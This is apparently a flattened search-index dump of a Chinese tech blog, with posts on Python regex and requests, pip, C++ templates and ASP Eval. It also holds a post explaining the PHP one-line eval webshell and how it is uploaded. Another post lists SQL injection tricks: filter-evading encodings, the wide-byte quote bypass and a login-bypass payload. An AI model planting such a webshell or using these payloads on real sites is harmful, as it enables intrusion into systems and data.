re.findall('\\\\\\n','\\n\\n')['\\n', '\\n']&gt;&gt;&gt; re.findall('\\\\\\\\n','\\n\\n')[]&gt;&gt;&gt; re.findall('\\b','\\b\\b')['\\x08', '\\x08']&gt;&gt;&gt; re.findall('\\\\b','\\b\\b')[]&gt;&gt;&gt; re.findall('\\\\\\b','\\b\\b')['\\x08', '\\x08']&gt;&gt;&gt; re.findall('\\\\\\\\b','\\b\\b')[]&gt;&gt;&gt; re.findall('\\c','\\c\\c') #只有这个不同，实际上是'\\\\c'，但由于re的规则变为了c['c', 'c']&gt;&gt;&gt; re.findall('\\\\c','\\c\\c')['c', 'c']&gt;&gt;&gt; re.findall('\\\\\\c','\\c\\c')['\\\\c', '\\\\c']&gt;&gt;&gt; re.findall('\\\\\\\\c','\\c\\c')['\\\\c', '\\\\c'] 这里就我现在的理解看来是无法匹配出&#39;\\c&#39;的，当然我的理解有限，欢迎指正。","categories":[{"name":"python","slug":"python","permalink":"http://coordinate.wang/categories/python/"}],"tags":[{"name":"python","slug":"python","permalink":"http://coordinate.wang/tags/python/"},{"name":"反斜杠","slug":"反斜杠","permalink":"http://coordinate.wang/tags/反斜杠/"},{"name":"正则表达式","slug":"正则表达式","permalink":"http://coordinate.wang/tags/正则表达式/"}]},{"title":"浅析一句话木马","slug":"2017-07-25-浅析一句话木马","date":"2017-07-24T16:00:00.000Z","updated":"2018-02-18T03:29:07.027Z","comments":true,"path":"2017/07/25/2017-07-25-浅析一句话木马/","link":"","permalink":"http://coordinate.wang/2017/07/25/2017-07-25-浅析一句话木马/","excerpt":"","text":"一开始对于一句话木马感觉很神奇，因为它特别的短，用过的人都知道。分析原理后，又非常想知道到底是什么人想出这么一个好的想法，真的非常的天才。 以php一句话为例子 1&lt;?php eval($_POST[c]); ?&gt; 我么将这句话保存为x.php文件上传到网站中，通过菜刀可以轻松连接。 究其原理其实很简单，看下面这个做法，通过对x.php中的c进行post 菜刀的功能无非是把我们要post的数据传给了c，而这个c在菜刀中就是“密码”。 一句话木马能连接成功有两个前提条件： 服务器端没有禁止Adodb.Stream组件，因为我们使用一句话木马写入WebShell代码的条件是服务器端创建Adodb.Stream组件，如果该组件被禁用的话无法写入。 权限问题，如果当前的虚拟目录禁止user组或者everyone写入，同样不会成功。","categories":[{"name":"信息安全","slug":"信息安全","permalink":"http://coordinate.wang/categories/信息安全/"}],"tags":[{"name":"原理","slug":"原理","permalink":"http://coordinate.wang/tags/原理/"},{"name":"木马","slug":"木马","permalink":"http://coordinate.wang/tags/木马/"},{"name":"php","slug":"php","permalink":"http://coordinate.wang/tags/php/"}]},{"title":"pip更新过期的python库","slug":"2017-07-24-pip更新过期的python库","date":"2017-07-23T16:00:00.000Z","updated":"2018-02-18T03:29:07.006Z","comments":true,"path":"2017/07/24/2017-07-24-pip更新过期的python库/","link":"","permalink":"http://coordinate.wang/2017/07/24/2017-07-24-pip更新过期的python库/","excerpt":"","text":"查看系统里过期的python库，可以用pip命令 12pip list #列出所有安装的库pip list --outdated #列出所有过期的库 对于列出的过期库，pip更新的命令 1pip install --upgrade 库名 在stackoverflow上有人提供了批量更新的办法，一个循环就搞定（注意–upgrade后面的空格） 12345import pipfrom subprocess import call for dist in pip.get_installed_distributions(): call(\"pip install --upgrade \" + dist.project_name, shell=True) 另外的也有人提到用 pip-review 12pip install pip-reviewpip-review --local --interactive","categories":[{"name":"python","slug":"python","permalink":"http://coordinate.wang/categories/python/"}],"tags":[{"name":"python","slug":"python","permalink":"http://coordinate.wang/tags/python/"},{"name":"pip","slug":"pip","permalink":"http://coordinate.wang/tags/pip/"}]},{"title":"python re的简单运用","slug":"2017-07-23-python re的简单运用","date":"2017-07-22T16:00:00.000Z","updated":"2018-02-18T03:29:07.004Z","comments":true,"path":"2017/07/23/2017-07-23-python re的简单运用/","link":"","permalink":"http://coordinate.wang/2017/07/23/2017-07-23-python re的简单运用/","excerpt":"","text":"0x00 引言本文主要对编写脚本时出现的问题做一些小结，想要学习关于re的详细知识的话，可以关闭这个页面了。 0x01 re.complie语法：re.compile(strPattern[, flag]) 第一个参数strPattern为正则表达式，第二个参数flag是匹配模式，取值可以使用按位或运算符’|’表示同时生效，比如re.I | re.M。另外，你也可以在regex字符串中指定模式，比如：re.compile(&#39;pattern&#39;, re.I | re.M) 与re.compile(&#39;(?im)pattern&#39;) 是等价的。 flag参数可选值有： 简写 全名 注释 I IGNORECASE 忽略大小写 M MULTILINE 多行模式 S DOTALL 单选模式——点任意匹配模式 L LOCALE 使预定字符类 \\w \\W \\b \\B \\s \\S 取决于当前区域设定 U UNICODE 使预定字符类 \\w \\W \\b \\B \\s \\S \\d \\D 取决于unicode定义的字符属性 X VERBOSE 详细模式。该模式下正则表达式可以是多行，忽略空白字符，并可以加入注释。 0x02 re.findall语法：re.findall(pattern, string[, flags]) 正则 re.findall 的简单用法（返回string中所有与pattern相匹配的全部字串，返回形式为数组） 例子： 1234import rep = re.compile(r'\\d+') /*\\d是匹配一个数字 +表示匹配前面的子表达式一次或多次。例如，'zo+' 能匹配 \"zo\" 以及 \"zoo\"，但不能匹配 \"z\"。+ 等价于 &#123;1,&#125;。*/print p.findall('one1two2three3four4') 结果为[‘1’, ‘2’, ‘3’, ‘4’]","categories":[{"name":"python","slug":"python","permalink":"http://coordinate.wang/categories/python/"}],"tags":[{"name":"python","slug":"python","permalink":"http://coordinate.wang/tags/python/"},{"name":"re","slug":"re","permalink":"http://coordinate.wang/tags/re/"}]},{"title":"python requests的简单运用","slug":"2017-07-22-python requests的简单运用","date":"2017-07-21T16:00:00.000Z","updated":"2018-02-18T03:29:06.994Z","comments":true,"path":"2017/07/22/2017-07-22-python requests的简单运用/","link":"","permalink":"http://coordinate.wang/2017/07/22/2017-07-22-python requests的简单运用/","excerpt":"","text":"0x01 无参数请求1234567import requestsr = requests.get('http://www.baidu.com')r = requests.post(\"http://httpbin.org/post\")r = requests.put(\"http://httpbin.org/put\")r = requests.delete(\"http://httpbin.org/delete\")r = requests.head(\"http://httpbin.org/get\")r = requests.options(\"http://httpbin.org/get\") 0x02 在URL中传递参数有时候我们要在URL中添加参数，例如百度搜索时word后面添加的搜索词 123payload = &#123;'word': '黄皮子坟'&#125;r = requests.get(\"http://www.baidu.com/s\", params=payload)print r.url 结果为 http://www.baidu.com/s?word=%E9%BB%84%E7%9A%AE%E5%AD%90%E5%9D%9F 可以通过r.text来获取网页的内容 1print r.text 内容太多，这里就不打出来了，读者可以自己尝试。 可以通过r.headers来获取响应头内容。 1print r.headers 结果为{‘BDQID’: ‘0x8582eb7400002a8b’, ‘X-Powered-By’: ‘HPHP’, ‘Transfer-Encoding’: ‘chunked’,…} 请求头内容可以用r.request.headers来获取 1print r.request.headers 结果为{‘Connection’: ‘keep-alive’, ‘Accept-Encoding’: ‘gzip, deflate’, ‘Accept’: ‘/‘, ‘User-Agent’: ‘python-requests/2.18.2’} 0x03 使用session先初始化一个session对象，s = requests.Session()，然后使用这个session对象来进行访问，r = s.post(url,data = user)。 下面这个例子用来模拟登陆V2EX，问题的关键在于抓取post数据包 123456789101112131415161718import requestsfrom bs4 import BeautifulSoupurl = r\"https://www.v2ex.com/signin\"v2ex_session = requests.Session()f = v2ex_session.get(url)soup = BeautifulSoup(f.content,\"html.parser\")once = soup.find('input',&#123;'name':'once'&#125;)['value']u = soup.find('input',&#123;'placeholder':'用户名或电子邮箱地址'&#125;)['name']p = soup.find('input',&#123;'type':'password'&#125;)['name']user = &#123;u:'username', p:'password', 'once': once, 'next': '/'&#125;v2ex_session.headers = &#123;'User-Agent': \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50\"&#125;v2ex_session.headers.update(&#123;'referer': url&#125;) #要注意这里refererv2ex_session.post(url, data = user)f = v2ex_session.get('http://www.v2ex.com/settings')print f.content 0x04 cookie的使用使用cookies解决登录问题 123456789101112cookies=&#123;&#125; line = 'cookie的内容' #抓包获取for line in raw_cookies.split(';'): key,value=line.split('=',1) #1代表只分一次，得到两个数据 cookies[key]=valueurl = r\"https://www.v2ex.com/signin\"v2ex_session = requests.Session()v2ex_session.headers = &#123;'User-Agent': \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50\"&#125;v2ex_session.headers.update(&#123;'referer': url&#125;) #要注意这里refererf = v2ex_session.get(url,cookies=cookies) f = v2ex_session.get('http://www.v2ex.com/settings')print f.content 但是貌似有出现了问题，因为网站使用的https连接 http和https的区别： url的前面是https://而不是http://，使用ssl进行加密/身份认证，并且http的默认端口是80，https的默认端口是443。 因为有ssl的认证和加密，所以具体的底层的通信过程中会有不同，https的这一层在建立连接的时候，需要设置socket属性，socket属性的生成需要使用具体的方法调用，方法调用的参数需要指定：ca_certs=服务器端给提供的公钥证书即可。 然后如果还有客户端认证的话，那客户端也可以提供出自己的key_file，cert_file。 什么是ssl？ ssl的全称是(Secure Sockets Layer)安全套接层，另外还有TLS（Transport Layer Secure，传输层安全），这两种协议都是为网络提供安全和数据完整性的一种安全协议，在传输层对网络连接进行加密。 为什么要用这个？ 防止数据以及网络连接的传输内容被截获，所以涉及到个人或者重要的信息等，都需要进行建立ssl连接，通过https的请求方式加密处理。","categories":[{"name":"python","slug":"python","permalink":"http://coordinate.wang/categories/python/"}],"tags":[{"name":"python","slug":"python","permalink":"http://coordinate.wang/tags/python/"},{"name":"requests","slug":"requests","permalink":"http://coordinate.wang/tags/requests/"}]},{"title":"SQL注入中的一些小技巧","slug":"2017-07-21-SQL注入中的一些小技巧","date":"2017-07-20T16:00:00.000Z","updated":"2018-02-18T03:29:06.978Z","comments":true,"path":"2017/07/21/2017-07-21-SQL注入中的一些小技巧/","link":"","permalink":"http://coordinate.wang/2017/07/21/2017-07-21-SQL注入中的一些小技巧/","excerpt":"","text":"0x01 mysql的注入方式 # 到该行结束 # 这个注释直到该行结束 – 到该行结束 – 这个注释直到该行结束注意： – (双长划) 注释风格要求在两个长划后至少有一个空格！自MySQL3.23.3 以来，除了刚才介绍的注释风格外，还可以用两个短划线和一个空格（“– ”）来开始注释；从这两个短划线到行的结束的所有内容都作为注释处理。有的数据库以双短划线作为注释的起始。MySQL也允许这样，但需要加一个空格以免产生混淆。例如，带有如像5–7 这样的表达式的语句有可能被认为包含一个注释，但不可能写5– 7这样的表达式，因此，这是一个很有用的探索。然而，这仅仅是一个探索，最好不用这种风格的注释。 / 行中间或多个行 /单引号和双引号：被用来标志一个被引用字符串的开始，即使是在一个注释中。如果注释中的引号没有另一个引号与之配对，那和语法分析程序就不会认为注释结束。如果你以交互式运行 mysql，你会产生困惑，因为提示符从 mysql&gt; 变为 ‘&gt; 或 “&gt;。 分号：被用于指出当前 SQL 语句的结束并且跟随它的任何东西表示下一行的开始。 0x02 limit下的字段数判断众所周知where条件下的字段数可以用order by判断，而limit后可以利用 limit 0,1 into @,@ （@的数目为字段数）@为mysql临时变量 例如： 1select * from hehe limit 0,1 into @,@; 0x03 or条件下的回显例子： 123select * from hehe where id='1' or '1'='1'; /*显示所有记录*/select * from hehe where id='1' or '1'='2'; /*只显示id=1记录*/select * from hehe where id='2' or '1'='2'; /*只显示id=2记录*/ 0x04 concat与concat_ws与group_concatMySQL的concat函数在连接字符串的时候，只要其中一个是NULL,那么将返回NULL 123456789101112131415SQL&gt; SELECT CONCAT('FIRST ', 'SECOND');+----------------------------+| CONCAT('FIRST ', 'SECOND') |+----------------------------+| FIRST SECOND |+----------------------------+1 row in set (0.00 sec)SQL&gt; SELECT CONCAT('FIRST ', null);+------------------------+| CONCAT('FIRST ', null) |+------------------------+| null |+------------------------+1 row in set (0.00 sec) 和concat不同的是, concat_ws函数在执行的时候,不会因为NULL值而返回NULL 0x05 逻辑操作符被过滤我们知道在 MySQL 中使用 SQL SELECT 命令来读取数据， 同时我们可以在 SELECT 语句中使用 WHERE 子句来获取指定的记录。WHERE 子句中可以使用等号 = 来设定获取数据的条件，如 “runoob_author = ‘RUNOOB.COM’”。但是有时候我们需要获取 runoob_author 字段含有 “COM” 字符的所有记录，这时我们就需要在 WHERE 子句中使用 SQL LIKE 子句。SQL LIKE 子句中使用百分号 %字符来表示任意字符，类似于UNIX或正则表达式中的星号 *。如果没有使用百分号 %, LIKE 子句与等号 = 的效果是一样的。 例子： 12345678mysql&gt; SELECT * from runoob_tbl WHERE runoob_author LIKE '%COM';+-----------+---------------+---------------+-----------------+| runoob_id | runoob_title | runoob_author | submission_date |+-----------+---------------+---------------+-----------------+| 3 | 学习 Java | RUNOOB.COM | 2015-05-01 || 4 | 学习 Python | RUNOOB.COM | 2016-03-06 |+-----------+---------------+---------------+-----------------+2 rows in set (0.01 sec) 0x06 ’被过滤 hex编码 1SELECT password FROM Users WHERE username = 0x61646D696E char编码 1SELECT FROM Users WHERE username = CHAR(97, 100, 109, 105, 110) html实体字符编码 1SELECT FROM Users WHERE username = 'admin'%2527 二次编码%2527这里主要是因为绕过magic_quotes_gpc过滤，因为%25解码为%,结合后面的27也就是%27也就是’，所以成功绕过过滤。 宽字节大家都知道%df’ 被PHP转义（开启GPC、用addslashes函数，或者icov等），单引号被加上反斜杠\\，变成了 %df\\’，其中\\的十六进制是 %5C ，那么现在%df\\’ =%df%5c%27，如果程序的默认字符集是GBK等宽字节字符集，则MySQL用GBK的编码时，会认为 %df%5c 是一个宽字符，也就是縗’，也就是说：%df\\’ = %df%5c%27=縗’，有了单引号就好注入了。 0x07 表名等关键字被过滤以information_schema.tables为例 空格 information_schema . tables 着重号 information\\&lt;/em>schema.tables 特殊符 /!informationschema.tables/ 别名 information_schema.(partitions),(statistics),(keycolumnusage),(table_constraints) 0x08 表单认证绕过1\"SELECT username FROM users WHERE username='$username' AND password='$password'\" 这样的直接username=admin’#即可，或者username=’=’&amp;password=’=’这样就能构造出 123\"SELECT username FROM users WHERE username=''='' AND password=''=''\"#即$sql = “select user from flag where 1 and 1”;","categories":[{"name":"信息安全","slug":"信息安全","permalink":"http://coordinate.wang/categories/信息安全/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"http://coordinate.wang/tags/sql注入/"},{"name":"mysql","slug":"mysql","permalink":"http://coordinate.wang/tags/mysql/"}]},{"title":"ASP Eval、Execute、ExecuteGlobal区别分析","slug":"2017-07-20-ASP Eval、Execute、ExecuteGlobal区别分析","date":"2017-07-19T16:00:00.000Z","updated":"2018-02-18T03:29:06.946Z","comments":true,"path":"2017/07/20/2017-07-20-ASP Eval、Execute、ExecuteGlobal区别分析/","link":"","permalink":"http://coordinate.wang/2017/07/20/2017-07-20-ASP Eval、Execute、ExecuteGlobal区别分析/","excerpt":"","text":"Eval 计算一个表达式的值并返回结果。 语法：[result = ]eval_r(expression_r) expression_r 为任意有效 VBScript 表达式的字符串 示例： 1response.Write(eval_r(&quot;3+2&quot;)) &apos;输出 5 “3+2” 使用引号括起来，表示是一个字符串，但是在 Eval “眼里”，把它当作一个表达式 3+2 来执行。 Execute 执行一个或多个指定的语句。多个语句间用冒号（:）隔开。 语法：Execute statements 示例： 1Execute &quot;response.Write(&quot;&quot;abc&quot;&quot;)&quot; &apos;输出 abc “response.Write(“”abc””)” 使用引号括起来，表示是一个字符串 但是在 Execute “眼里”，把它当作一个语句 response.Write(“abc”) 来执行。 ExecuteGlobal 在全局名字空间中执行一个或多个指定的语句。 语法：ExecuteGlobal statement 示例： 12345678910dim c c = &quot;全局变量&quot; sub S1() dim c c = &quot;局部变量&quot; Execute &quot;response.Write(c)&quot; &apos;输出 局部变量 ExecuteGlobal &quot;response.Write(c)&quot; &apos;输出 全局变量 end sub Execute &quot;response.Write(c)&quot; &apos;输出 全局变量 call S1() 变量 c 既在全局范围内定义，也在函数范围内定义，Execute 按自己所处的位置来决定使用局部变量还是全局变量，而 ExecuteGlobal 则始终只认全局范围的 c。 总结： Eval 只执行一个语句 语句可以有也可以没有返回值 Execute 执行一个或多个语句 忽略语句的返回值 ExecuteGlobal 执行一个或多个语句 忽略语句的返回值 全局变量和局部变量同名时总是使用全局变量 注意： 在 VBScript 中“赋值”与“比较”都是使用“=”，比如“a=b”既可以说是将 b 值赋予 a，也可以说是判断 a 与 b 是否相等，那么 eval_r(“a=b”) 是表示赋值还是比较运算呢？ 这里有个约定，在 Eval 中，“a=b”总是表示比较运算，在 Execute 和 ExecuteGlobal 中，总是表示赋值。","categories":[{"name":"asp","slug":"asp","permalink":"http://coordinate.wang/categories/asp/"}],"tags":[{"name":"asp","slug":"asp","permalink":"http://coordinate.wang/tags/asp/"},{"name":"Eval","slug":"Eval","permalink":"http://coordinate.wang/tags/Eval/"},{"name":"Execute","slug":"Execute","permalink":"http://coordinate.wang/tags/Execute/"},{"name":"ExecuteGlobal","slug":"ExecuteGlobal","permalink":"http://coordinate.wang/tags/ExecuteGlobal/"}]},{"title":"比较map内部对象的大小","slug":"2017-07-18-比较map内部对象的大小","date":"2017-07-17T16:00:00.000Z","updated":"2018-02-18T03:29:06.931Z","comments":true,"path":"2017/07/18/2017-07-18-比较map内部对象的大小/","link":"","permalink":"http://coordinate.wang/2017/07/18/2017-07-18-比较map内部对象的大小/","excerpt":"","text":"问题描述：对一个大小给定的map\\&lt;size_t, Checkout>中的Checkout对象作比较，对其最小值做插入操作 Checkout对象如下： 12345678910111213141516171819202122class Checkout&#123;private: std::queue&lt;Customer&gt; customers; // The queue waiting to checkoutpublic: void add(const Customer&amp; customer) &#123; customers.push(customer); &#125; size_t qlength() const &#123; return customers.size(); &#125; // Increment the time by one minute void time_increment() &#123; if (!customers.empty()) &#123; // There are customers waiting... if (customers.front().time_decrement().done()) // If the customer is done... customers.pop(); // ...remove from the queue &#125; &#125;; bool operator&lt;(const Checkout&amp; other) const &#123; return qlength() &lt; other.qlength(); &#125; bool operator&gt;(const Checkout&amp; other) const &#123; return qlength() &gt; other.qlength(); &#125; Checkout&amp; operator=(const Checkout&amp; other) &#123; customers = other.customers; return *this; &#125;&#125;; 解决办法： 1234567891011121314151617181920template&lt;class ForwardIt&gt;ForwardIt min_checkout(ForwardIt first, ForwardIt last)&#123; if (first == last) return last; Checkout smallest = first-&gt;second;//注意这里的细节 ForwardIt pr = first; ++first; for (; first != last; ++first) &#123; if (first-&gt;second &lt; smallest) &#123; smallest = first-&gt;second; pr = first; &#125; &#125; return pr;&#125;...min_checkout(std::begin(checkouts), std::end(checkouts))-&gt;second.add(Customer(service_t)); 这里还要注意一个问题，就是对map要做一次初始化，给其分配空间 12345678map&lt;std::string, Checkout&gt; checkouts;//关于如何初始化一个大小给定的map。我也没有什么好的做法，只能想到这样。Checkout init;for (size_t i&#123;&#125;; i &lt; n_checkouts; ++i)&#123; auto pr = std::make_pair(std::to_string(i), init); checkouts.insert(pr);&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"map","slug":"map","permalink":"http://coordinate.wang/tags/map/"}]},{"title":"error C2678: binary '='","slug":"2017-07-17-error C2678 binary =","date":"2017-07-16T16:00:00.000Z","updated":"2018-02-18T03:29:06.915Z","comments":true,"path":"2017/07/17/2017-07-17-error C2678 binary =/","link":"","permalink":"http://coordinate.wang/2017/07/17/2017-07-17-error C2678 binary =/","excerpt":"","text":"今天天碰到这样一个问题：对一个unordered_multimap 做有序输出，对你没听错！！！总是有这样一些稀奇古怪的问题:( !!! 我的想法很简单，对unordered_multimap内的元素做冒泡排序。 结果编译期间报错：C2678 二进制“=”: 没有找到接受“const Name”类型的左操作数的运算符(或没有可接受的转换) 12345678910111213141516171819// List all elementstemplate&lt;typename Container&gt;void list_elements(Container&amp; container)&#123; auto&amp; iter = container.begin(); auto&amp; iter2 = ++iter; for (; iter != container.end(); ++iter) &#123; for (; iter2 != container.end(); ++iter2) &#123; if ((*iter).first &lt; (*iter2).first) &#123; (*iter).swap(*iter2);//compliation error &#125; &#125; &#125; for (const auto&amp; element : container) std::cout &lt;&lt; element.second &lt;&lt; std::endl;&#125; 问题的关键在于我这里用的container是unordered_multimap，而这个container的swap函数是针对整体做交换。我的做法是使用pointer指向内部，比较内部变量，然后对单一变量做交换。 机智的我最后的想了一个做法，是用了一个vector作为缓冲:smile:： 1234567891011// List all elementstemplate&lt;typename Container&gt;void list_elements(Container&amp; container)&#123; std::vector&lt;Person&gt; temp; for (const auto&amp; element : container) temp.push_back(element.second); std::sort(temp.begin(), temp.end(), std::greater&lt;Person&gt;()); for (const auto&amp; element : temp) std::cout &lt;&lt; element &lt;&lt; std::endl;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"error","slug":"error","permalink":"http://coordinate.wang/tags/error/"},{"name":"unordered_multimap","slug":"unordered-multimap","permalink":"http://coordinate.wang/tags/unordered-multimap/"}]},{"title":"piecewise_construct的作用","slug":"2017-07-14-piecewise_construct的作用","date":"2017-07-13T16:00:00.000Z","updated":"2018-02-18T03:29:06.915Z","comments":true,"path":"2017/07/14/2017-07-14-piecewise_construct的作用/","link":"","permalink":"http://coordinate.wang/2017/07/14/2017-07-14-piecewise_construct的作用/","excerpt":"","text":"常量 std::piecewise_construct 是空的结构体标签类型 std::piecewise_construct_t 的一个实例。std::piecewise_construct_t 是用于在接收二个 tuple 参数的不同函数间消歧义的空结构体标签类型。不使用 std::piecewise_construct_t 的重载假设每个 tuple 参数各变成一个 pair 的元素。使用 std::piecewise_construct_t 的重载假设每个 tuple 参数用于逐块构造一个指定类型的新对象，而它将成为 pair 的元素。 1234567891011121314151617181920212223#include &lt;iostream&gt;#include &lt;utility&gt;#include &lt;tuple&gt; struct Foo &#123; Foo(std::tuple&lt;int, float&gt;) &#123; std::cout &lt;&lt; \"Constructed a Foo from a tuple\\n\"; &#125; Foo(int, float) &#123; std::cout &lt;&lt; \"Constructed a Foo from an int and a float\\n\"; &#125;&#125;; int main()&#123; std::tuple&lt;int, float&gt; t(1, 3.14); std::pair&lt;Foo, Foo&gt; p1(t, t); //Constructed a Foo from a tuple //Constructed a Foo from a tuple std::pair&lt;Foo, Foo&gt; p2(std::piecewise_construct, t, t); //Constructed a Foo from an int and a float //Constructed a Foo from an int and a float&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"piecewise_construct","slug":"piecewise-construct","permalink":"http://coordinate.wang/tags/piecewise-construct/"}]},{"title":"=default的作用","slug":"2017-07-13-default的作用","date":"2017-07-12T16:00:00.000Z","updated":"2018-02-18T03:29:06.915Z","comments":true,"path":"2017/07/13/2017-07-13-default的作用/","link":"","permalink":"http://coordinate.wang/2017/07/13/2017-07-13-default的作用/","excerpt":"","text":"“=default” instructs the compiler to generate the default implementation for the function. Defaulted functions have two advantages: They are more efficient than manual implementations, and they rid the programmer from the chore of defining those functions manually.By default, C++ will provide a default constructor, copy constructor, copy assignment operator (operator=) and a destructor. If you provide alternate versions of any of these functions for your class, C++ will not provide a default version. However, in C++11, you can now specify that you would like the compiler to provide a default one anyway. This is done by prototyping the function and using the default specifier.The default specifier can only be used with functions that have a default.=default: it means that you want to use the compiler-generated version of that function, so you don’t need to specify a body.=delete: it means that you don’t want the compiler to generate that function automatically. 在C+11中，对于defaulted函数，编译器会为其自动生成默认的函数定义体，从而获得更高的代码执行效率，也可免除程序员手动定义该函数的工作量。C++的类有四类特殊成员函数，它们分别是：默认构造函数、析构函数、拷贝构造函数以及拷贝赋值运算符。这些类的特殊成员函数负责创建、初始化、销毁，或者拷贝类的对象。如果程序员没有显式地为一个类定义某个特殊成员函数，而又需要用到该特殊成员函数时，则编译器会隐式的为这个类生成一个默认的特殊成员函数。当存在用户自定义的特殊成员函数时，编译器将不会隐式的自动生成默认特殊成员函数，而需要程序员手动编写，加大了程序员的工作量。并且手动编写的特殊成员函数的代码执行效率比编译器自动生成的特殊成员函数低。C++11标准引入了一个新特性：defaulted函数。程序员只需在函数声明后加上”=default;”，就可将该函数声明为defaulted函数，编译器将为显式声明的defaulted函数自动生成函数体。defaulted函数特性仅适用于类的特殊成员函数，且该特殊成员函数没有默认参数。defaulted函数既可以在类体里(inline)定义，也可以在类体外(out-of-line)定义。","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"default","slug":"default","permalink":"http://coordinate.wang/tags/default/"}]},{"title":"理解引用折叠","slug":"2017-07-08-理解引用折叠","date":"2017-07-07T16:00:00.000Z","updated":"2018-02-18T03:29:06.908Z","comments":true,"path":"2017/07/08/2017-07-08-理解引用折叠/","link":"","permalink":"http://coordinate.wang/2017/07/08/2017-07-08-理解引用折叠/","excerpt":"","text":"转自 Effective Modern C++ 条款28 理解引用折叠 条款23提起过把一个实参传递给模板函数时，无论实参是左值还是右值，推断出来的模板参数都会含有编码信息。那条款没有提起，只有模板形参是通用引用时，这件事才会发生，不过对于这疏忽，理由很充分：条款24才介绍通用引用。把这些关于通用引用和左值/右值编码信息综合，意味着这个模板， 12template&lt;typename T&gt;void func(T&amp;&amp; param); 无论param是个左值还是右值，需要推断的模板参数T都会被编码。 编码技术是很简单的，当传递的实参是个左值时，T就被推断为一个左值引用，当传递的实参是个右值时，T就被推断为一个非引用类型。（注意这是不对称的：左值会编码为左值引用，但右值编码为非引用。）因此： 1234Widget widgetFactory(); // 返回右值的函数Widget w; // 一个变量，左值func(w); // 用左值调用函数，T被推断为Widget&amp;func(widgetFactory()); // 用右值调用函数，T被推断为Widget 两个func调用都是用Widget参数，不过一个Widget是左值，另一个是右值，从而导致了模板参数T被推断出不同的类型。这，正如我们将很快看到，是什么决定通用引用变成左值引用或右值引用的，而这也是std::forward完成工作所使用的内部技术。 在我们紧密关注std::forward和通用引用之前，我们必须注意到，在C++中对引用进行引用是不合法的。你可以尝试声明一个，你的编译器会严厉谴责加抗议： 123int x;...auto&amp; &amp; rx = x; // 报错！不可以声明对引用的引用 但想一想当一个左值被传递给接受通用引用的模板函数时： 123template&lt;typename T&gt;void func(T&amp;&amp; param); // 如前func(w); // 用左值调用func，T被推断为Widget&amp; 如果使用推断出来的T类型（即Widget&amp;）实例化模板，我们得到这个： 1void func(Widget&amp; &amp;&amp; param); 一个对引用的引用！然而你的编译器内有深刻谴责加抗议。我们从条款24知道，通用引用param用一个左值进行初始化，param的类型应该出一个左值引用，但编译器是如何推断T的类型的，还有是怎样把它替代成下面这个样子，哪一个才是最终的签名呢？ 1void func(Widget&amp; param); 答案是引用折叠。是的，你是禁止声明对引用的引用，但编译器在特殊的上下文中可以产生它们，模板实例化就是其中之一。当编译器生成对引用的引用时，引用折叠指令就会随后执行。 有两种类型的引用（左值和右值），所以有4种可能的对引用引用的组合（左值对左值，左值对右值，右值对左值，右值对右值）。如果对引用的引用出现在被允许的上下文（例如，在模板实例化时），这个引用（即引用的引用，两个引用）会折叠成一个引用，根据的是下面的规则： 如果两个引用中有一个是左值引用，那么折叠的结果是一个左值引用。否则（即两个都是右值引用），折叠的结果是一个右值引用。在我们上面的例子中，在函数func中把推断出来的类型Widget&amp;替代T后，产生了一个对右值的左值引用，然后引用折叠规则告诉我们结果是个左值引用。 引用折叠是使std::forward工作的关键部分。就如条款25解释那样，对通用引用使用std::forward，是一种常见的情况，像这样： 1234567template&lt;typename T&gt;void f(T&amp;&amp; fParam)&#123; ... // do some works someFunc(std::forward&lt;T&gt;(fParam)); // 把fParam转发到someFunc&#125; 因为fParam是一个通用引用，我们知道无论传递给函数f的实参（即用来初始化fParam的表达式）是左值还是右值，参数类型T都会被编码。std::forward的工作是，当且仅当传递给函数f的实参是个右值时，把fParam（左值）转换成一个右值。 这里是如何实现std::forward来完成工作： 12345template&lt;typename T&gt; // 在命名空间std中T&amp;&amp; forward(typename remove_reference&lt;T&gt;::type&amp; param)&#123; return static_cast&lt;T&amp;&amp;&gt;(param);&#125; 这没有完全顺应标准库（我省略了一些接口细节），不过不同的部分是与理解std::forward如何工作无关。 假如传递给函数f的是个左值的Widget，T会被推断为Widget&amp;，然后调用std::forward会让它实例化为std::forward\\&lt;Widget&amp;>。把Widget&amp;加到std::forward的实现中，变成这样： 1234Widget&amp; &amp;&amp; forward(typename remove_reference&lt;Widget&amp;&gt;::type&amp; param)&#123; return static_cast&lt;Widget&amp; &amp;&amp;&gt;(param);&#125; remove_reference\\&lt;Widget&amp;>::type产生的是Widget，所以std::forward边冲这样： 12Widget&amp; &amp;&amp; forward(Widget&amp; param)&#123; return static_cast&lt;Widget&amp; &amp;&amp;&gt;(param); &#125; 在返回类型和cast中都会发生引用折叠，导致被调用的最终版本的std::forward： 12Widget&amp; forward(Widget&amp; param)&#123; return static_cast&lt;Widget&amp;&gt;(param); &#125; 就如你所见，当一个左值被传递给模板函数f时，std::forward被实例化为接受一个左值引用和返回一个左值引用。std::forward内部的显式转换没有做任何东西，因为param的类型已经是Widget&amp;了，所以这次转换没造成任何影响。一个左值实参被传递给std::forward，将会返回一个左值引用。根据定义，左值引用是左值，所以传递一个左值给std::forward，会导致std::forward返回一个左值，就跟它应该做的那样。 现在假设传递给函数f的是个右值的Widget。在这种情况下，函数f的类型参数T会被推断为Widget。因此f里面的std::forward会变成std::forward\\&lt;Widget>。在std::forward的实现中用Widget代替T，像这样： 1234Widget&amp;&amp; forward(typename remove_reference&lt;Widget&gt;::type&amp; param)&#123; return static_cast&lt;Widget&amp;&amp;&gt;(param);&#125; 